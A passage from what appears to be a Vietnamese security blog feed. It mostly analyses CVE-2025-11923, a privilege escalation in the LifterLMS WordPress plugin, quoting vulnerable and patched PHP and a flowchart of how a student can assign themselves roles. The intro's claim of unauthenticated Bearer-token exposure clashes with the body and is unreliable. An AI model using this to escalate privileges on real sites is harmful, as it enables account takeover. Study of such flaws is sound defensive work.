danh sách role được phép (&lt;code&gt;subscriber&lt;/code&gt;, &lt;code&gt;customer&lt;/code&gt;) để &lt;strong&gt;ngăn leo thang đặc quyền&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Khi phân tích lỗ hổng, luôn so sánh &lt;strong&gt;phiên bản vulnerable vs patched&lt;/strong&gt; để xác định thay đổi bảo mật.&lt;/li&gt;&#xA;&lt;li&gt;Sử dụng phiên bản &lt;strong&gt;cũ (v51.1.14)&lt;/strong&gt; có thể phục vụ mục đích phân tích hoặc PoC, nhưng không nên triển khai trên môi trường production.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/king-addons/vulnerability/wordpress-king-addons-for-elementor-plugin-51-1-36-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress King Addons for Elementor Plugin &amp;lt;= 51.1.36 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11923 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-02-cve-2025-11923/</link>
      <pubDate>Fri, 02 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-02-cve-2025-11923/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin LifterLMS cho WordPress bị lỗ hổng &lt;strong&gt;lộ thông tin nhạy cảm&lt;/strong&gt; trong tất cả các phiên bản từ trước đến &lt;strong&gt;9.1.0&lt;/strong&gt;, thông qua endpoint REST API &lt;strong&gt;/mcp/v1/&lt;/strong&gt;. Lỗ hổng này làm lộ &lt;strong&gt;Bearer Token&lt;/strong&gt; khi tùy chọn &lt;strong&gt;“No-Auth URL”&lt;/strong&gt; được bật. Điều này cho phép kẻ tấn công &lt;strong&gt;không cần xác thực&lt;/strong&gt; lấy được bearer token, từ đó có thể truy cập vào một phiên làm việc hợp lệ và thực hiện nhiều hành động như &lt;strong&gt;tạo tài khoản quản trị viên mới&lt;/strong&gt;, dẫn đến &lt;strong&gt;leo thang đặc quyền&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11923&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11923&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 9.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 9.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Student&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/lifterlms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LifterLMS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LifterLMS&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;9.1.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;9.1.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;    // $this-&amp;gt;namespace = &amp;#39;llms/v1&amp;#39;&#xA;    // $this-&amp;gt;rest_base = &amp;#39;students&amp;#39;&#xA;    register_rest_route(&#xA;        $this-&amp;gt;namespace,&#xA;        &amp;#39;/&amp;#39; . $this-&amp;gt;rest_base . &amp;#39;/(?P&amp;lt;id&amp;gt;[\d]&amp;#43;)&amp;#39;,&#xA;        array(&#xA;            &amp;#39;args&amp;#39;   =&amp;gt; array(&#xA;                &amp;#39;id&amp;#39; =&amp;gt; array(&#xA;                    &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;Unique identifier for the resource.&amp;#39;, &amp;#39;lifterlms&amp;#39; ),&#xA;                    &amp;#39;type&amp;#39;        =&amp;gt; &amp;#39;integer&amp;#39;,&#xA;                ),&#xA;            ),&#xA;            ...&#xA;            array(&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::EDITABLE, // POST, PUT, PATCH&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;update_item&amp;#39; ),&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;update_item_permissions_check&amp;#39; ),&#xA;                &amp;#39;args&amp;#39;                =&amp;gt; $this-&amp;gt;get_endpoint_args_for_item_schema( WP_REST_Server::EDITABLE ), // see class-wp-rest-controller.php.&#xA;            ),&#xA;            ...&#xA;            &amp;#39;schema&amp;#39; =&amp;gt; array( $this, &amp;#39;get_public_item_schema&amp;#39; ),&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với cấu hình trên, API được expose dưới dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/llms/v1/students/{id}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đó:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;(?P&amp;lt;id&amp;gt;[\d]+)&lt;/code&gt; là một named regex group, WordPress sẽ tự động parse giá trị này và gán vào URL params.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;WP_REST_Server::EDITABLE&lt;/code&gt; tương đương với các method: &lt;code&gt;POST&lt;/code&gt;, &lt;code&gt;PUT&lt;/code&gt;, &lt;code&gt;PATCH&lt;/code&gt; =&amp;gt; điều này yêu cầu header &lt;code&gt;X-WP-Nonce&lt;/code&gt; trong request&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi có request gửi đến endpoint này với method hợp lệ, WordPress sẽ gọi &lt;code&gt;update_item()&lt;/code&gt;. Tuy nhiên, trước khi hàm này được thực thi, request bắt buộc phải vượt qua bước kiểm tra quyền thông qua &lt;code&gt;update_item_permissions_check()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item_permissions_check( $request ) {&#xA;    if ( get_current_user_id() === $request[&amp;#39;id&amp;#39;] ) {&#xA;        return true;&#xA;    }&#xA;&#xA;    if ( ! current_user_can( &amp;#39;edit_students&amp;#39;, $request[&amp;#39;id&amp;#39;] ) ) {&#xA;        return llms_rest_authorization_required_error( __( &amp;#39;You are not allowed to edit this student.&amp;#39;, &amp;#39;lifterlms&amp;#39; ) );&#xA;    }&#xA;&#xA;    return $this-&amp;gt;check_roles_permissions( $request );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tại dòng 2, hàm gọi &lt;code&gt;get_current_user_id()&lt;/code&gt; để lấy ID của user đang đăng nhập, sau đó so sánh với giá trị &lt;code&gt;id&lt;/code&gt; được truyền qua URL. Nếu hai giá trị này trùng nhau, nghĩa là người dùng đang chỉnh sửa chính tài khoản của mình, và request được cho phép ngay.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;get_current_user_id()&lt;/code&gt; chỉ trả về giá trị khác &lt;code&gt;0&lt;/code&gt; khi request đã được xác thực thành công. Việc xác thực này phụ thuộc vào việc request có kèm theo &lt;code&gt;X-WP-Nonce&lt;/code&gt; hợp lệ hay không. Nguyên nhân là vì trong quá trình xử lý REST API, WordPress luôn gọi callback &lt;code&gt;rest_cookie_check_errors&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;941&#34; width=&#34;1700&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nếu không có nonce trong query/body (&lt;code&gt;_wpnonce&lt;/code&gt;) hoặc trong header (X-WP-Nonce) thì user hiện tại sẽ được gán &lt;code&gt;id=0&lt;/code&gt; khiến &lt;code&gt;get_current_user_id()&lt;/code&gt; sẽ trả về 0. Nếu nonce không hợp lệ =&amp;gt; request bị reject hoàn toàn.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/invalid.png&#34; title=&#34;Invalid nonce&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/invalid.png&#34; data-sub-html=&#34;&lt;h2&gt;Invalid nonce&lt;/h2&gt;&lt;p&gt;Invalid nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/invalid.png&#39; alt=&#34;Invalid nonce&#34; height=&#34;560&#34; width=&#34;1563&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Invalid nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Để lấy được REST API nonce, ta cần đăng nhập vào Admin Dashboard và gọi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt;, vì nonce này chỉ được WordPress inject vào trang khi người dùng đã đăng nhập hợp lệ.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/get_nonce.png&#34; title=&#34;Lấy giá trị của nonce&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get nonce&lt;/h2&gt;&lt;p&gt;Lấy giá trị của nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/get_nonce.png&#39; alt=&#34;Get nonce&#34; height=&#34;697&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Lấy giá trị của nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi vượt qua được bước kiểm tra quyền, &lt;code&gt;update_item&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item( $request ) {&#xA;    $object = $this-&amp;gt;get_object( $request[&amp;#39;id&amp;#39;] );&#xA;    if ( is_wp_error( $object ) ) {&#xA;        return $object;&#xA;    }&#xA;&#xA;    $schema = $this-&amp;gt;get_item_schema();&#xA;    $item   = $this-&amp;gt;prepare_item_for_database( $request );&#xA;    // Exclude additional fields registered via `register_rest_field()`.&#xA;    $item   = array_diff_key( $item, $this-&amp;gt;get_additional_fields() );&#xA;    $object = $this-&amp;gt;update_object( $item, $request );&#xA;    ...&#xA;    $response = $this-&amp;gt;prepare_item_for_response( $object, $request );&#xA;&#xA;    return $response;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này tạo đối tượng student tương ứng với &lt;code&gt;id&lt;/code&gt; được truyền trong request, sau đó gọi &lt;code&gt;update_object()&lt;/code&gt; để cập nhật student với các tham số tương ứng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function update_object( $prepared, $request ) {&#xA;    $prepared[&amp;#39;ID&amp;#39;] = $prepared[&amp;#39;id&amp;#39;];&#xA;&#xA;    $object_id = wp_update_user( $prepared );&#xA;    if ( is_wp_error( $object_id ) ) {&#xA;        return $object_id;&#xA;    }&#xA;&#xA;    unset( $prepared[&amp;#39;ID&amp;#39;] );&#xA;&#xA;    return $this-&amp;gt;update_additional_data( $object_id, $prepared, $request );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Biến &lt;code&gt;$prepared&lt;/code&gt; là giá trị trả về của hàm &lt;code&gt;prepare_item_for_database()&lt;/code&gt;. Tuy nhiên, trong quá trình xử lý, field roles — vốn cần thiết để thực hiện tấn công &lt;strong&gt;Privilege Escalation&lt;/strong&gt; — đã bị loại bỏ.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/miss_role.png&#34; title=&#34;Roles đã bị loại khỏi prepare&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/miss_role.png&#34; data-sub-html=&#34;&lt;h2&gt;Miss role&lt;/h2&gt;&lt;p&gt;Roles đã bị loại khỏi prepare&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/miss_role.png&#39; alt=&#34;Miss role&#34; height=&#34;528&#34; width=&#34;787&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Roles đã bị loại khỏi prepare&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;update_additional_data()&lt;/code&gt; được gọi sau khi dữ liệu chính của student đã được cập nhật, nhằm xử lý các dữ liệu mở rộng (additional data) gắn với user nhưng không nằm trong bảng chính.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function update_additional_data( $object_id, $prepared, $request ) {&#xA;    $object = $this-&amp;gt;get_object( $object_id );&#xA;    ...&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        $user = $object-&amp;gt;get_user();&#xA;        $user-&amp;gt;set_role( &amp;#39;&amp;#39; );&#xA;        foreach ( $request[&amp;#39;roles&amp;#39;] as $role ) {&#xA;            $user-&amp;gt;add_role( $role );&#xA;        }&#xA;    }&#xA;&#xA;    return $object;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này tạo đối tượng student tương ứng với &lt;code&gt;id&lt;/code&gt; được truyền trong request, sau đó duyệt qua danh sách &lt;code&gt;roles&lt;/code&gt; do client gửi lên và gán từng role cho user.&lt;/p&gt;&#xA;&lt;p&gt;Đây chính là điểm mấu chốt dẫn đến lỗ hổng &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã cập nhật lại logic kiểm tra quyền trong &lt;code&gt;update_item_permissions_check()&lt;/code&gt; như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item_permissions_check( $request ) {&#xA;&#xA;    if ( is_wp_error( ( new WP_REST_Users_Controller() )-&amp;gt;update_item_permissions_check( $request ) ) ) {&#xA;        return llms_rest_authorization_required_error( __( &amp;#39;You are not allowed to edit this user.&amp;#39;, &amp;#39;lifterlms&amp;#39; ) );&#xA;    }&#xA;&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        return $this-&amp;gt;check_roles_permissions( $request );&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trước tiên, hàm gọi lại &lt;code&gt;update_item_permissions_check()&lt;/code&gt; của &lt;code&gt;WP_REST_Users_Controller&lt;/code&gt; để đảm bảo toàn bộ cơ chế kiểm tra quyền mặc định của WordPress được áp dụng.&lt;/p&gt;&#xA;&lt;p&gt;Nếu hàm này trả về lỗi (&lt;code&gt;WP_Error&lt;/code&gt;), request sẽ bị từ chối ngay lập tức.&lt;/p&gt;&#xA;&lt;p&gt;Nếu request có chứa trường &lt;code&gt;roles&lt;/code&gt;, hệ thống tiếp tục gọi &lt;code&gt;check_roles_permissions()&lt;/code&gt; để kiểm tra quyền gán role.&lt;/p&gt;&#xA;&lt;p&gt;Nếu không có &lt;code&gt;roles&lt;/code&gt;, request được cho phép thực thi.&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;check_roles_permissions()&lt;/code&gt; được định nghĩa như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function check_roles_permissions( $request ) {&#xA;&#xA;    global $wp_roles;&#xA;&#xA;    $schema = $this-&amp;gt;get_item_schema();&#xA;    $roles  = array();&#xA;&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        $roles = $request[&amp;#39;roles&amp;#39;];&#xA;    } elseif ( ! empty( $schema[&amp;#39;properties&amp;#39;][&amp;#39;roles&amp;#39;][&amp;#39;default&amp;#39;] ) ) {&#xA;        $roles = $schema[&amp;#39;properties&amp;#39;][&amp;#39;roles&amp;#39;][&amp;#39;default&amp;#39;];&#xA;    }&#xA;&#xA;    foreach ( $roles as $role ) {&#xA;&#xA;        if ( ! isset( $wp_roles-&amp;gt;role_objects[ $role ] ) ) {&#xA;            return llms_rest_bad_request_error(&#xA;                sprintf( __( &amp;#39;The role %s does not exist.&amp;#39;, &amp;#39;lifterlms&amp;#39; ), $role )&#xA;            );&#xA;        }&#xA;&#xA;        $potential_role = $wp_roles-&amp;gt;role_objects[ $role ];&#xA;&#xA;        /*&#xA;         * Don&amp;#39;t let anyone with &amp;#39;edit_users&amp;#39; (admins) edit their own role to something without it.&#xA;         * Multisite super admins can freely edit their blog roles -- they possess all caps.&#xA;         */&#xA;        if (&#xA;            ! ( is_multisite() &amp;amp;&amp;amp; current_user_can( &amp;#39;manage_sites&amp;#39; ) )&#xA;            &amp;amp;&amp;amp; get_current_user_id() === $request[&amp;#39;id&amp;#39;]&#xA;            &amp;amp;&amp;amp; ! $potential_role-&amp;gt;has_cap( &amp;#39;edit_users&amp;#39; )&#xA;        ) {&#xA;            return llms_rest_authorization_required_error(&#xA;                __( &amp;#39;You are not allowed to give users this role.&amp;#39;, &amp;#39;lifterlms&amp;#39; )&#xA;            );&#xA;        }&#xA;&#xA;        // Include admin functions to get access to `get_editable_roles()`.&#xA;        require_once ABSPATH . &amp;#39;wp-admin/includes/admin.php&amp;#39;;&#xA;&#xA;        // The new role must be editable by the logged-in user.&#xA;        $editable_roles = get_editable_roles();&#xA;&#xA;        if ( empty( $editable_roles[ $role ] ) ) {&#xA;            return llms_rest_authorization_required_error(&#xA;                __( &amp;#39;You are not allowed to give users this role.&amp;#39;, &amp;#39;lifterlms&amp;#39; )&#xA;            );&#xA;        }&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cơ chế này đảm bảo:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Luôn kế thừa đầy đủ kiểm tra quyền gốc của WordPress.&lt;/li&gt;&#xA;&lt;li&gt;Không cho phép tự thay đổi role nếu không có quyền tương ứng.&lt;/li&gt;&#xA;&lt;li&gt;Không cho gán role không tồn tại hoặc không nằm trong danh sách role có thể chỉnh sửa.&lt;/li&gt;&#xA;&lt;li&gt;Loại bỏ hoàn toàn khả năng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; thông qua REST API.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated Student (has valid nonce)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST /wp-json/llms/v1/students/{id}&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;update_item_permissions_check()&amp;#34;]&#xA;&#xA;C --&amp;gt; D{&amp;#34;get_current_user_id() == request.id ?&amp;#34;}&#xA;&#xA;D -- Yes --&amp;gt; E[&amp;#34;Bypass capability checks&amp;#34;]&#xA;D -- No --&amp;gt; F[&amp;#34;Denied&amp;#34;]&#xA;&#xA;E --&amp;gt; G[&amp;#34;update_item()&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;prepare_item_for_database()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;roles field removed from prepared data&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;update_object()&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;update_additional_data()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Read roles directly from request&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;Apply roles via set_role() / add_role()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;User role escalated&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; 